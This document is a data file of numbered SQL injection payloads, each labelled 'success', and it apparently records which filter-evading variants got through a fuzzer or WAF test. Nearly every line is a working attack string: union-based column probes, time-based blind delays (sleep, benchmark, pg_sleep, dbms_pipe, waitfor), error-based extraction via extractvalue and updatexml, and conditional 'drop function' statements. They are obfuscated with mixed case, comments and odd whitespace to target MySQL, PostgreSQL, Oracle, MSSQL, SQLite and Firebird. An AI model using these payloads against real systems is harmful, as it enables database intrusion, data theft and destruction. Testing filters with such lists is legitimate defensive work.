0 success "1')\nunion all seLect null,null,null,null,null,null,null-- "
1 success '1") as amak WhErE 1046 in (0x415,1046,1047) anD elt(1210 LIkE 1210,sleep(5))-- '
9 success '1" wheRE \'a\'<>\'ar\' anD make_set(\'zIgPM\' not like\x0b\'zIgPM[\',8899)-- '
12 success "1') aND\x0bsleep(5)#/**/"
14 success '1) aS pyjx WhERe 375<>376;SeleCT benchmark(5000000,md5(0x714e4153))#/**/<4'
20 success "0x1')\x0cor\nsleep(0x5) and ('kgbm'='kgbm "
21 success "1%') aNd 'y^O'!='y^OS'\x0bAND (selECt 0x1a78)/**/LIke 6776# +"
22 success '-4926" whErE 0x1fd8 lIKe 8152\nAnD 1 Or\n4339=5547# '
24 success '1")) union all sELECt null,null,null,null,null,null,null,null,null# 4'
28 success '1%");select\x0cbenchmark(5000000,md5(0x4c4d6142)) and ("%"="/**/'
32 success '1")) as qhnb WHerE \'@/\'=\'@/\' AnD ((seLECt\x0c3020)=3020 aNd 1)*6703-- )hhH'
33 success "-0xffd'))\nunion\nall SeLEct (sElEcT\x0c5785),0x1699,0x1699# bF"
38 success "1%'/**/AND\nsleep(0x5)# "
41 success "0x1) WHerE 0x1e31=7729;iif('[QA'='[QA' || False aNd '[' NOT LIKE '[/' Or 'f'<>'f',(SElect 1),1/0)\x0b"
42 success "0x1 wHeRE '/**/'<>' f';sElECT pg_sleep(0x5)-- "
46 success '1\') as rvch where \'B\'!=\'B"\' or 8384=like(\'abcdefg\',upper(hex(randomblob(0x1dcd6500/(SeLect 2)))))--\x0c'
47 success "(extractvalue(0x6df,concat(0x5c,0x7171706a71,(SElect/**/(elt('b-s'\tlIke\t'b-s',0x1))),0x717a767a71)))\x0c"
48 success "1')/*&*/union all seLEcT null,null,null-- "
52 success '-3219") order/**/by\x0b1-- '
57 success '-2411 oR (8459 like 8459)*4906# pxwg\n'
59 success "1' In boolean/**/mode) ||/**/elt(0x16f1=(sELEct 5873)/**/OR 0,sleep(0x5))# HS"
62 success "1') and make_set('#'<>'#N',8899) and ('kyxl'='kyxl "
68 success '1)))/**/oR 6793=(seLECt 6793 FrOm\x0bpg_sleep(5)) and (((5548!=5549 '
69 success '1))) ANd elt(6371 not like 6372,sleep(5))# '
70 success "1')));Select cAse WHeN 3819 LIke 1887 thEn/**/1 ELsE null end-- 1Y"
71 success "1)));selECt\n(caSE when (7332/*<'*/iN (7331,7332,7333) Or False Or 0) Then 4660 elSE cast(1 AS int)/(selECT 0 fROM dual) enD) FROm dual--/*\\aTI*/"
75 success "0x1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions\tas t4 and ('qfls'='qfls "
77 success '1%")));select\ndbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)/**/from dual and ((("%"=" '
80 success '1%" Or/**/8514=benchmark(5000000,md5(0x544d5a4c))#\n1'
84 success "0x1')) anD 0x1ffd\x0bLike (sElect\ncount(*) FRoM/*<3-J*/sysibm.systables As t1,sysibm.systables AS\nt2,sysibm.systables as t3)-- g"
85 success "-0x1be6'))\x0bunion\tall/*<<At*/SeLeCt\x0c(SeLEct/**/0x13db),5083,(sElEcT 5083),5083# Q"
88 success "-1366' or\x0bmake_set('n'='n',7185) and 'abre'='abre/**/"
98 success "0x1)\nAs nmlm WhERE 9872=0x2690 or '\ty' NOT LIKE '\ty';SELeCt LikE('abcdefg',upper(hex(randomblob(0x1dcd6500/0x2))))-- "
99 success '1")\tand\nmake_set(4553=8132,0x1fc4)/**/and ("pfci" like "pfci '
101 success '1 aNd\x0b(1977=6852)*6852--/**/clxl -A'
103 success '-0x1846"/*\n79*/union\x0call SeLEcT\t3323,3323# ;'
104 success "1') As/**/ybuv wHere 9641=(SeLEcT 9641) union all/**/sElECt null,null,null,null,null,null,null,null-- "
106 success '0x1)  OR  sleep(0x5) ANd (0x8a3=2211 '
107 success '1") and/***/sleep(0x5)\nand ("fsuf" like "fsuf '
113 success "1' WhERe 2162=2162 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)# "
115 success '1%");seLEcT/*Ij*/(caSe whEn (1898 Like 4705) tHEN 1898 eLse 1/(SEleCT 0) EnD)--\x0c'
117 success '1")) and make_set(1167=5027,0x13a3)\x0cand/**/(("grfi"="grfi/*h:*/'
119 success '-2817) WHEre 1212=0x4bc Or 3266=1102/**/'
120 success '1))/**/as myyh wHerE 0x13fc=5116 oR 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr((seLECt 109)),5)--\tCS'
122 success "0x1' union all sEleCt null,null,null,null,null,null,null,null,null,null#\t"
123 success "1') ANd 3560 like 0x155b-- 0x3"
124 success "0x1;sElecT lIkE('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf  Z"
127 success '1";selecT benchmark(5000000,md5(0x4c4d6142)) '
128 success "1\x0bwhere\t'\x0bsj\x0b' NOT LIKE '\x0bsj\x0bW'/*%1S`*/and (9492=4334)*4334-- &kc"
130 success "0x1%'));select count(*)\nfrom rdb$fields as\tt1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='/**/"
131 success '(sElEcT 1)%"))/**/union all\x0bSeleCT null,null,null# \n)'
137 success "1')/**/or extractvalue(0x511,concat(0x5c,0x7171706a71,(SELECt/*(*/(elt('=rm#'='=rm#',0x1))),0x717a767a71))\nMr:"
139 success "1)) AS rbae wHERE 2049 LIKE 2049 or 6979=liKe('abcdefg',upper(hex(randomblob(0x1dcd6500/2))))-- "
140 success '1\x0caND elt(4249 like 4249,7259)# lwyo I|'
149 success "1'\x0bWheRE 8159\x0blike 8159 union/**/all/*6iUV*/sELEcT null# a9"
152 success "1%')))\nor 2633=dbms_pipe.receive_message(chr(0x70)||chr(65)||chr(65)||chr(103),5)/**/and\t((('%'=' "
154 success "0x1')/**/where '+'='+'\x0band elt('\ni'<>'\ni]',sleep((sElEct 0x5)))-- Ve"
158 success "1%')) aND 'Z'<>'Zp'-- H{"
159 success '-3710)) union all\tSEleCt (SELECT 5770),0x168a,0x168a,0x168a,5770,0x168a,0x168a#/**//O:M'
163 success '0x1\')))\x0cand elt(9501=8427,(SELECT 8427))/*8b"c*/and (((\'ahpp\'=\'ahpp '
166 success '1";select pg_sleep(0x5)--/**/i8'
167 success "-9389')\x0border/**/by 1# "
168 success '1)));select\x0bpg_sleep(0x5)/**/and/**/(((0x1cf/**/LIKE 463 '
170 success "0x1))\x0cas khvx\twhere ')'<>')\\'/**/union all select null,null,null,null,null,null,null,null-- ~ "
171 success '1"))) union all sElecT null,null,null,null,null,null,null,null-- '
172 success '0x1)/**/AnD (SeLect *\x0bfRom\x0b(seLEcT(sleep(0x5)))fzno)\n'
173 success '1")))/**/and\x0bmake_set(\'L\'=\'L\',0x22c3)\x0band ((("czvm" like "czvm/**/'
175 success '1%"/**/AnD 1343=5939# '
182 success "1') union\tall SeLECT null,null,null,null,null,null,null,null# "
183 success '1 union all SELeCT null,null,null,null,null,null,null,null,null,null# <u'
186 success '1 WHeRE/**/6221=(sEleCt 6221) or \'b\r"\'=\'b\r"o\' AND 9254=(SELect/*! F9*/count(*)\x0bFrOm/**/rdb$fields as t1,rdb$types aS t2,rdb$collations\tAs t3,rdb$functions aS t4)-- '
189 success "1'))) and make_set(6094=0xb71,2929) and\n((('gkyo'='gkyo "
191 success '0x1%")));begin dbms_lock.sleep(0x5); end-- t'
193 success '(seLeCT 1)%"))) union/**/all SElECt null,null,null,null,null--\n'
202 success "1%'/**/Or 4240=(sElECt 4240/**/FroM pg_sleep(5))-- I"
203 success "1);waitfor/*Al*/delay/*%qjf0*/'0:0:5'-- "
205 success '1)) aS queb wHerE\t2449/**/lIkE 2449 union all SeLecT null,null# '
215 success "1'\x0bWHerE 0x10b0=(SELECT 0x10b0) union/*8ldj*/all\x0bsELECt null,null,null,null# "
216 success '1"/**/or 6979=like(\'abcdefg\',upper(hex(randomblob(0x1dcd6500/2))))--\n'
219 success "0x1');sELect/**/pg_sleep(0x5)\x0c"
221 success "1')) and make_set(3793=0x1fb6,0x1fb6)/**/and (('swvc' like\t'swvc/*qs*/"
222 success '1"))\nunion all SeleCT/**/null,null,null,null-- '
223 success '-0x165e%"))\nor 0x1ad8=6872/**/and/**/(("%"="/**/'
226 success '-6618"))) order/*WVWK_*/by 1#\n'
227 success '(Select 1)"\tWHERE \'\x0cF\' like \'\x0cF\' union all SelECT null,null,null,null,null,null,null,null# '
229 success '1)) as ogcv wHErE 4396 LIKe 4396;If(0x1edb=7899 AND 0x1 && 1) sEleCt 7899 else DRoP function/**/zbbp-- T'
230 success '1)) as lkqx wHERe 6468 lIKe 0x1944 oR (seLEcT * fROM (sELeCT(sleep(5)))sddo)#/**/,>'
231 success '1" wHerE \'//\' LIke \'//\'\nanD True\x0cOR False and 1 union all sElEcT null,null,null,null,null,null,null# '
233 success '0x1) aS yduh wHErE 0x1951=0x1951 AND 0x190e=(SeleCt count(*) FrOm rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions as t4)-- '
241 success "-(SELECT 6220)'/**/union/*woo*/all sElect (seLEct 1462),1462# J%"
242 success '1) aS afxc WHeRe 2879!=2880 oR 7358 lIkE 7359 aND True;sElEct count(*) fROm rdb$fields As t1,rdb$types AS t2,rdb$collations as t3,rdb$functions aS t4-- '
244 success "-4100')) union all\tSeleCT/*[LL~*/0x48b,1163,(selECT 1163)--/**/*"
245 success "(seLecT/*:n7*/0x1)%')) union all/**/selecT\nnull,null,null,null,null,null,null,null,null,null-- 4E"
246 success "1';SElect (CAse WHen (7990 lIkE 7627) THen/*4-*/7990\tElSe 1/(selECt 0) ENd)--/**/"
247 success '(SelECt 1)%"))) union all SElECt null,null,null,null,null,null# '
250 success '-1351" where \'FZU?\'<>\'FZU?]\' or 5684 LIKE 8582 '
251 success "-(SelECt 2431)')/**/or '(SeLECt\n5)'='5' AND/**/'Pyj{'<>'Pyj{\\'-- Q:"
253 success "0x1%')) and\tmake_set(0x197f=9529,0x2539) and/**/(('%'='/*i#5e*/"
256 success "0x1%')))  Or  sleep(0x5)#\tfApTZA"
260 success "1') wHeRe 'qY'!='qYc' OR 'C(\\Sv'!='C(\\Sv'/**/AND True AND '/vq'<>'/vqO';SelEcT dbms_pipe.receive_message(chr(112)||chr(0x46)||chr(0x6a)/*2NT&*/oR chr(78),5) FrOm\x0cdual--\x0c"
264 success "-9721'\x0cOr\telt(9511\x0clIKe 9238,9238)/**/"
266 success '1"))) ANd (sELEcT 7135)=8805# '
267 success "-7271'))) or make_set('d'='d' OR/**/False,7185)\nand ((('mdtw'='mdtw "
269 success '(sELECt\x0b1)))) anD/*0Oc*/2388 lIKE benchmark(0x4c4b40,md5(0x6d457153))# '
271 success "1 wHeRe/**/0x1ed7=7895 and/*'0x0=S*/8407=(seLeCT count(*) fRoM\x0bgenerate_series(1,0x4c4b40))-- W"
274 success '-(SeLECt 8143))\tunion/**/all/**/seLECt\t0xbc6--/*Yk&l7*/'
279 success '1") Where 0x74e=(sEleCt (SElEcT/**/1870)) && True union all SeleCt null,null,null,null,null,null,null,null-- '
280 success '1)\x0cwHEre\t4573 lIkE 0x11dd;seLEcT count(*) FRom/*|5,;*/all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--/**/m:'
282 success '1")) aS femc/*U*/where 1313=0x521\nanD/**/True AND 3357<>3358# '
283 success '1)) As tnhy wHeRE 6718<>6719 anD 2858=7324# '
285 success "0x1'))) rlike/**/sleep(0x5)/**/and/**/((('svuu'='svuu/**/"
287 success "-0xf1c')) or\tmake_set(6809=1236,1236)/*j*/and/**/(('evnj'='evnj "
288 success "1) oR updatexml(0x710,concat(0x2e,0x7171706a71,(sELEcT/**/(elt('$@{#'<>'$@{#6',(seLeCT 1)))),0x717a767a71),8666)\x0b"
289 success '(sElECt (caSE WheN (9525/**/lIKE 9280) tHen 9525 elSE (sEleCt 9525)*(sELecT\t9525 FrOM\tmaster..sysdatabases) eNd))/*\n)8*/'
290 success "1') As\nihsc WHERe 3978 LiKE 3978;begin user_lock.sleep(0x5); eND-- :"
291 success "0x1'))/**/union all select null,null,null,null,null,null,null,null,null# "
295 success '1));if(7899 like 7899)\tselect 7899 else drop function zbbp-- '
297 success '1")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)/*t&*/and (("nubc" like "nubc '
299 success "0x1';SeLEct/**/dbms_pipe.receive_message(chr(112) Or chr((seLecT 70))||chr(106)||chr(0x4e),5) FRom dual-- "
301 success "-0x1360')/*(l;!*/union/**/all/*K*/sElEcT 0x14b4-- Eo"
303 success '0x1") as yzzk where/**/1813 like 1813 and (0xbcc LIKE\n3020)*6703--/**/D'
305 success '-1643\' where/*"NH*/0x7b0=1968/**/or 3484=6642\t'
307 success "1%')))\x0bAND/*O*/8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)-- "
310 success '0x1") and \'pX)\'<>\'pX)0x2\' and\t("yqzq"="yqzq\x0c'
312 success "-0x754%')\x0cunion all SELeCt/*y*/0x193f--/**/KsrT"
314 success "1') union all/**/select null,null,null,null,null,null,null,null,null,null# "
318 success "1')))\tand (0xbcc=3020/**/OR False)*0x1a2f and ((('ujds'='ujds "
319 success '1 Or 0x93f=(SelEcT count(*) FroM rdb$fields AS t1,rdb$types\tas t2,rdb$collations as t3,rdb$functions aS t4)--/*+I0*/'
320 success "1'/**/and elt(5855!=5856 OR\x0cFalse OR 0,7259)/**/and 'awjd'='awjd "
322 success '-5996) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106) or chr(113)||(SeLEcT (cASE whEN (3275!=3276 OR False OR/*\\}#\r@*/6888<>6888 Or False)\x0ctHeN 1 eLse 0 End) frOm dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(0x71))) '
326 success "1));selecT count(*) FroM rdb$fields As t1,rdb$types AS/**/t2,rdb$collations\x0bas t3,rdb$functions as t4 anD (('W'='W' Or False && 0xc85 iN/**/(3204,3205,3206) "
327 success '1") as rnte WherE 6517=(sElECt 6517) oR False && 9254=(SELect count(*) frOm rdb$fields as t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions as t4)--/**/'
329 success "1/*D*/and elt('W=T'!='W=TD',sleep(5))# macc "
330 success '-7749" OR/**/(2689 like\x0c7481)*7481 '
333 success '0x1"\tor/**/elt(\'\x0c\'=\'\n\'\x0cAND 1,sleep(5))/*g9fA*/and "zzca"="zzca\x0c'
334 success '1)) union/*~\tI+%*/all select null,null,null,null,null,null,null-- '
335 success "1') and elt(0x1d82=0x1871,6257) and ('bpzm'='bpzm\n"
336 success '-2912")\x0caS eizh wheRe\x0b\'X0\'=\'X0\' Or 0 Or make_set(1041 LIKe 3056,3056)-- '
337 success '1")) AS uels whERE \'v \'=\'v \' Or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--/**/'
341 success '1")/*op>*/aND/**/2388=benchmark(5000000,md5(0x6d457153))# '
342 success '1%")));selEcT (cAse/**/WHeN (8857=1512)/**/THeN\x0c8857 ELsE 8857*(sElEct 8857 frOm mysql.db) EnD)# '
347 success '1"\twherE 9665 LikE/**/9665  OR /**/sleep(5)#/**/'
355 success '0x1;SeleCt/**/sleep(5) '
357 success "1)) aS ehlg WHerE 2944 lIke 2944 && '[]mN\t'/**/not like '[]mN\tH';SELEct dbms_pipe.receive_message(chr(112) or chr(70)||chr(106) oR chr(78),5) FrOm dual-- aov9"
358 success "1%'));SEleCT\tbenchmark(0x4c4b40,md5(0x714e4153))#\x0b"
362 success '1"\x0band \'=\'<>\'=F\' AND 0x1 and "dqjp"="dqjp '
368 success "1'\x0cwHerE/*}\rz]*/'$'<>'$!' And/**/0x20d7=(sELecT count(*) From generate_series(1,(SELECT 5000000)))-- "
371 success "0x1')/**/union/*z8Z~*/all\nselect null,null,null#\x0b$"
374 success '-0x2491"))/**/union\nall/*\r*/SeLecT\x0b3112# ezTh\nr'
377 success '1 wHEre (SeLEcT\t7196)=7196 \x0bOR \x0b(SELECT 8466)=benchmark(0x4c4b40,md5(0x694a4745))-- A'
379 success "1)\nanD (SeLect 6240)=('qqpjq'||(SeLECt CaSE 6240 wHeN\x0b6240 tHEN 1 ElSe 0/**/end fROm rdb$database)||'qzvzq') "
380 success "iNSERT into [dimcustomer] SeLeCt geographykey,a.customerid,a.firstname,a.middlename,a.lastname,a.suffix,a.emailaddress fRom saleslt.customer a inner join saleslt.customeraddress b on a.customerid  LIKe  b.customerid inner join dimgeography c on c.geographyalternatekey  like  b.addressid If\nobject_id('dbo.dimdate') is not null "
381 success '0x1";begin/**/dbms_lock.sleep(0x5);\x0beND\t'
383 success "1');selECt (Case when ('0;''='0;'' OR 0) tHEN 3855 ELsE 1/(SeleCt 0)\teNd)-- $.bc"
384 success "1%'))\nunion all/**/select null,null,null,null,null,null,null,null,null-- "
387 success "1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and\x0b(('ywxe'/*iv*/like 'ywxe "
389 success '-(SELECT 6803)")\x0corder by 1#/**/G'
390 success '0x1")) aND/**/(SelEct *\tfrom (sEleCT(sleep(5)))gcrr)#/**/'
391 success "1%' aNd\x0c0x6c8=4220/**/"
396 success "-(sEleCT (SeLeCt (SelECt 8945))))) aS fszo/**/wHeRe '\tA8' not like '\tA8+' Or False union all SeleCT 2320--/*@*/"
398 success '1") aS\nrovd whERE 3764=3764 anD elt(\'@\'<>\'@W\',0x1c5b)-- g'
408 success "-(SeLeCt 0x7fe)') union all/*\x0b*/SELECt 0x1a0c,6668--/**/"
409 success "1' and 6240=('qqpjq'||(select/*2*/case 0x1860\twhen 6240 then 0x1 else 0 end/**/from rdb$database)||'qzvzq') and 'pnpx'='pnpx "
412 success "-(sELect 2483)' WhErE 7583!=7584 union\tall seLecT 1327# 6u"
413 success '(SelECt 0x1)") union\x0call SEleCT\nnull,null,null# Ho'
415 success "1')) AS dckd WhERE 0x702 LiKE 0x702;SeLEcT (CaSe wHeN (2914 liKE 3335) ThEn 2914 Else cast(0x1 as int)/(SelecT 0 FRom dual) end) froM/*l\x0cL[*/dual--/**/"
417 success '1")) order/**/by 1# \t'
418 success "0x1%' anD 0x2426=(SeleCt count(*)\tFRom/*&#<*/rdb$fields as t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS/**/t4)-- $"
421 success '1")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and\t(("nzhj" like "nzhj/*!*/'
423 success "0x1')) AS qpai wHeRE 2619 LiKe 0xa3b;(sElecT\n* frOm (seLECt(sleep(5)))acdk)#/*Sm4Uv*/"
428 success '-0x174a)) aS jbqv WheRE 2583=2583 OR False Or 0x1d48=8560--/*Mqvq*/'
435 success '1"))\nOR/**/7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)-- -'
437 success "1' AnD 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr((sElecT 112))||chr(106)||chr(113)||(sELeCT (casE when (6055=6055) tHeN/*I6*/1 eLSe 0 ENd) From dual)||chr(113)||chr(122)||chr(118) oR chr(122)||chr(113))) "
438 success '0x1"))) union all SElecT null,null,null,null,null-- '
447 success "1');sEleCt\x0bsleep(0x5)\t"
448 success "0x1' union all selECt null,null,null,null,null,null,null,null,null-- 9T"
456 success '1));SeLECt (CASe WhEN (9103=0x266c) Then 0x238f else cast(1 As int)/(sELect\x0b0 from dual) eNd) From dual--\n'
457 success "1' wHerE/**/'0&' NOT LIKE\n'0&V'/**/union all SEleCt null,null,null,null,null-- "
458 success "1') as rqfq wheRe 0x1ba5=7077 or 2367=(seLeCT\x0ccount(*) fROM rdb$fields AS t1,rdb$types/*P#u*/as t2,rdb$collations aS t3,rdb$functions As t4)-- "
463 success '1) AS wuio\nwHerE (SeleCt 5312) likE 5312 and True or False OR 7552=(seLeCt count(*) froM rdb$fields aS t1,rdb$types AS t2,rdb$collations as t3,rdb$functions AS t4)-- c'
464 success '1")) aS wwqj WHere\x0b3249 like 3249 And True aND 9254=(sELEcT count(*) FrOm rdb$fields aS t1,rdb$types As t2,rdb$collations as t3,rdb$functions AS t4)-- '
467 success '1%"))) && (sElECt 8594)=(seLECT\n(selecT 8594)/*b{<*/From pg_sleep(5))-- 3WZz'
468 success '-9737")))\x0border by/**/1-- '
471 success '1") AS bpmk wHeRE\n\'\n\'!=\'\nB\';Select (CaSE when (\'y\'/*\r4*/not like \'y:\') THeN/*t3AQ*/0xf0f eLSe 1/(sELEcT 0) END)-- Wc'
474 success '-0x18ed%")))/**/union all sELECt 1503,0x5df,(SElect\t0x5df),(sELEcT 1503)# '
483 success "(sELecT\n0x1)%'));SelecT sleep(0x5)# L("
486 success '1") aS kbjt whEre 3347!=3348 ANd\x0bTrue and (5978=6898)*6898-- '
490 success '1)));SELeCt count(*) fROm rdb$fields as t1,rdb$types aS t2,rdb$collations As t3,rdb$functions as t4 anD (((1105 LIKE 1105 aNd True\x0c'
492 success "1%' order by 0x1--/**/"
494 success '0x1"))) &&/**/(sElECT/**/0x954)=benchmark(0x4c4b40,md5(0x6d457153))# '
496 success "-3731'))) or\telt(7540=1412,0x584) and ((('iwch'='iwch "
503 success "0x1))/**/aS/**/jzzo wHEre 'A'='A' ANd 0x1 union/**/all sELEcT null,null,null,null,null# S "
511 success '0x1" union\tall SELecT null,null-- cl'
514 success "0x1%') and (0x1e18=0xda6)*0xda6 and\x0c('%'=' "
516 success '1%"))\x0b&&/*i*/8148 liKE lIKe(\'abcdefg\',upper(hex(randomblob(500000000/0x2))))--/**/VW'
518 success '0x1)) As\tpzoo wHerE 4251 like 4251 AND 1/**/OR False Or 6793=(Select 6793 FRoM pg_sleep(5))-- '
522 success "-2936)/**/or '1'<>'1t'\x0b"
526 success "1' IN boolean mode)\x0crlike (SElEcT (caSE wHEN (1343 lIkE 1595) THen 1/**/Else 0x28 eNd))# uE"
527 success "-7404' where 0x600=1536 OR 0 order/*&4-<2*/by\x0b1# "
532 success '1") WheRE \'#.V\' not like \'#.V&\' union all SeleCT null,null,null,null,null,null,null,null,null--/*4ATv*/s@a;-n['
533 success '0x1") wHere 0x304=772;SEleCt (cASE whEN (0xf0f=3855)/**/THEn 3855 eLSe 1/(SelEct 0)\x0beNd)--\x0bg18'
539 success "0x1') wHeRe 0x66d=0x66d rlike\x0bsleep((SelECt 0x5))-- N"
540 success '1;begin/**/dbms_lock.sleep(5); end-- elvi\x0b\rh'
541 success '1"/**/whERe/**/3933=(seLeCt 3933)/**/or extractvalue(1297,concat(0x5c,0x7171706a71,(sELeCT/**/(elt(\'S#\'!=\'S#:\',1))),0x717a767a71))-- '
543 success '1") and\x0b(\'D]/\'=\'D]/\')*0x1a2f and\x0b("qowc" like "qowc '
545 success "1) WherE\t'IJ!'<>'IJ!7' anD True aND elt(189<>190,7259)-- "
547 success '1") As htyo WHerE 8322 LIKE 8322 anD\n4595 LiKe 4595#  '
553 success '1 rlike\x0b(SElEcT (CaSE\x0bWHen ((Select 8314)=5463) tHeN/**/1 elSE\x0c0x28 end)) '
559 success '1 whERE 7705!=0x1e1a Or 6797 LiKE 6798 || False aND True;begin dbms_lock.sleep(5); eNd-- P'
561 success "0x1' In boolean mode)/**/union all SelECT\x0cnull,null# P]"
562 success '1");begin\x0cdbms_lock.sleep((SeleCt 5)); End--/**/'
570 success '1 WheRe 0x1fa6 lIkE\n8102 AND 9198\nlikE 0x23ee-- J b'
575 success "0x1%' union all/**/SELeCt null,null,null,null,null,null--/**/"
583 success '1"/**/and\x0b(7424=2381)*0x94d and "dvju"="dvju\x0c'
584 success '1))) aND sleep(5)/**/and (((6618=0x19da && 3196 lIkE 3196 '
588 success '0x1") aS fcrx WHere \';Y\'=\';Y\' aNd 0xb04=(seLeCT 5133) '
589 success '-5052))) union all\tsElEcT\x0b8351,(sEleCT 8351),8351,0x209f# '
590 success '1%"))) Or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90) Or\x0cchr(109),5)-- \x0c7'
592 success '0x1%");select\tsleep(0x5)# Br'
593 success "1%') &&/**/4061=2730# "
594 success "-8364')\tunion/*drR*/all sELECT 4732,0x127c,4732,0x127c,4732,0x127c,(selEct 4732),4732,4732#/**/4~P"
596 success "1%') oR/**/4240=(selEcT\t4240 fROM\x0cpg_sleep(0x5))-- Z_"
597 success "1'))) union all SEleCt null,null,null,null,null# wC"
602 success '1"/*FPg<f*/And\x0c0xef0=benchmark(5000000,md5(0x76555642))/**/'
603 success "1'))/**/or 8466=benchmark(5000000,md5(0x694a4745)) and\n(('ossj'='ossj "
604 success "0x1';select/*.;T\\*/benchmark(5000000,md5(0x4c4d6142))\x0cand 'gfpd'='gfpd "
605 success '0x1") as jidc WheRE 3188!=3189/**/aND 0x23ee=9198-- '
606 success '(sELeCt (CasE wheN (6461=1802) thEN 1 elsE cast(1 AS int)/(SelecT 0x0 fRoM dual)\nEnD) fRoM dual) '
608 success '0x1%")));sElEcT count(*) FroM rdb$fields As t1,rdb$types as t2,rdb$collations AS t3,rdb$functions/**/as t4-- r>/0x5'
609 success "1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions/*6\\KeM*/as t4 and ((('clhg'='clhg "
610 success '1\') aS ohnu WHEre 0x1001=(selECT 0x1001) union/*V<"^*/all sElEcT null,null,null,null,null,null,null,null,null-- '
612 success '1%") oR (sEleCT\x0c*/**/FRom (sEleCt(sleep(0x5)))sddo)# '
618 success "(SElEct 1)') as xhmm/**/whErE 'EY'<>'EYg' AND True union\x0ball SElECt null,null,null-- _\x0c"
621 success '(sELect 1)")/*\t#] */wHeRe 8390 LikE 8390;SeLect (CasE whEn (0x3e1/**/not like 994) then 4660 ELse cast(1 AS int)/(selECT 0 FrOm dual) End) frOm dual-- '
623 success '-0x2622)/*.0*/Or elt(0x168d/**/LIKE\x0b0x231a,8986) '
624 success "0x1'+(SeLeCt sijr wHerE\n7250 lIkE 0x1c52 or False;if(1665 like 3845) SeleCT 1665 ElSE/*gl)\tD*/drop function nzod-- "
630 success '1")));select/**/pg_sleep(5)/*8*/and ((("nvuv"\tlike "nvuv '
631 success '-5356\')\t|| 7659 In/*kQC"*/(7658,7659,7660)# $P+x'
634 success '1")));iif(989 not like 0x3de && 0x1,1,1/0) '
636 success '-0xa32%")\tunion/**/all sELeCt\x0b0x1e63,(sElecT\t7779),0x1e63,7779,0x1e63--/**/'
643 success "1');selECt/**/sleep(0x5)# "
644 success '1 WhErE 871\nIN (870,871,872) && 6969=(sELect 6969/**/frOm pg_sleep(5))-- WZ'
645 success "-8028%'))) ||\t(SeLEct 5042)=5214\x0b"
649 success '-8071)) Or 9160 lIkE 4253 '
654 success "1)) As wrhe\x0cwHErE 0x17e8=6120 anD 6240=('qqpjq'||(sELecT CaSE 6240 When 6240/**/TheN 1 ELsE 0 enD FRom rdb$database) Or 'qzvzq')-- qM"
660 success '(sELECt 1)) As uuro whERE 1440<>1441;If(7899=7899) SelecT 7899 eLsE dRop function zbbp-- '
662 success '0x1") union all sELECT null,null,null,null,null# \x0bF'
663 success "0x1)/*Y*/whERe\t(SELECT 8338)=8338 ANd 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(selecT (casE wHEn (']'\\,' LIKE ']'\\,' AND True || False) TheN 1 ELsE 0x0 eND) From dual)||chr(0x71)||chr(122)||chr(118)||chr(122)||chr(113)))-- \x0bz"
666 success '0x1%")) union all\tSeleCT null,null,null,null,null-- '
667 success "0x1'))) and (0x176b=0x2592)*0x2592 and ((('nagr' like\n'nagr "
675 success '1") as jiyl WherE 4893=4893 union all\nsElECt null,null,null,null,null# '
677 success "1))\n&& extractvalue(0x1f2e,concat(0x5c,0x7171706a71,(sELeCT (elt(7982=(SeleCT 0x1f2e),1))),0x717a767a71)) aND/**/(('u,'!='u,e' "
679 success '0x1")));select/**/count(*)/**/from/**/domain.domains as t1,domain.columns as t2,domain.tables as t3/**/and ((("ekbq"="ekbq '
681 success "1'||(select 'sbft' wHeRE 8748 Like 8748 anD 8190!=8191 ANd 1307!=1308;sEleCT count(*) frOm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions aS t4-- "
683 success '-6599%"))\tor make_set(\'Er\'!=\'Er1\',7185) and (("%"=" '
688 success "0x1%')) and ('0x5'<>'5w')*0x1a2f/**/and/**/(('%'=' "
692 success "1';iif(9007 likE/**/3836,1,1/0) "
695 success "-4736'))/**/or elt(5835=5509,0x1585)\x0cand (('iawg'='iawg "
700 success '0x1)));(SelECT *\tfRoM/*~\\E4*/(SeLeCT(sleep(0x5)))acdk)# w&F'
701 success '1") wheRe \'4n\' LIKE \'4n\' AnD \';>1\'=\';>1\' or False;SElEct dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual-- '
702 success "1%')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(0x75)||chr(65),5) and\n(('%'='/*HgK*/"
703 success '0x1%") union/**/all SelECt\x0bnull,null,null,null# '
706 success "1) As cinw WherE '@'<>'@F'\x0baND 8594=(sELect 8594 fROm pg_sleep(5))-- 2"
707 success "1) AS fnpq wherE 'ad'<>'ade';SElECt (casE wHeN (943=943)/*CB<\x0cH*/ThEN 4660 eLSE cast(1/**/as int)/(SelecT 0 from dual) eNd) FrOm dual-- GE"
711 success "0x1')));select\tlike('abcdefg',upper(hex(randomblob(500000000/0x2))))/**/and ((('mfib'='mfib "
715 success "1',(cASE wHEn 2872 LIke 2872 tHen 1 ElsE null enD) "
716 success '1\')) and 9198/**/liKE 9198--\tD"'
